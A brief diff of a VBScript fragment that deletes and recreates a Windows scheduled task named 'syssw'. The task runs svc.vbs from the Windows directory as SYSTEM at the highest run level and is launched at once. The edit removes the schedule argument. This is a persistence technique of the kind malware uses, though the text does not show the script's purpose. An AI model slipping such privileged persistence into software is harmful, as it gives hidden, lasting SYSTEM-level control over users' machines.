@@ -6,7 +6,7 @@ With oShell
   .Run "schtasks /delete /tn syssw /F", 0, True
   '.Run "schtasks /create /ru ""SYSTEM"" /sc minute /ST " & XmlTime(DateAdd("s", 30, Now)) & " /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
   
-  .Run "schtasks /create /ru ""SYSTEM"" /sc minute  /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
+  .Run "schtasks /create /ru ""SYSTEM""   /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
   .Run "schtasks /run /tn syssw", 0, True
 End With
 
